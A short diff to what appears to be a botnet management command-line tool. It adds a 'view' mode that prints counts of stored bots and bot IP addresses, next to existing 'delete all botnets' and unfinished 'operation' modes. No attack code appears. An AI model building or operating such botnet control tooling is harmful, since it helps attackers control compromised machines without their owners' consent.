@@ -58,6 +58,10 @@ switch (mode) {
         console.log(`\x1b[32m[+]\x1b[0m Deleted all botnets`);
 
         break
+    case "view":
+        console.log(`\x1b[32m[+]\x1b[0m Current have botnets: ${await kv.quantity()}`);
+        console.log(`\x1b[32m[+]\x1b[0m Current have botnets IP: ${await kv.quantityIP()}`);
+        break;
     case "operation":
         console.log("\x1b[32m[~] WIP\x1b[0m\n");
         break;
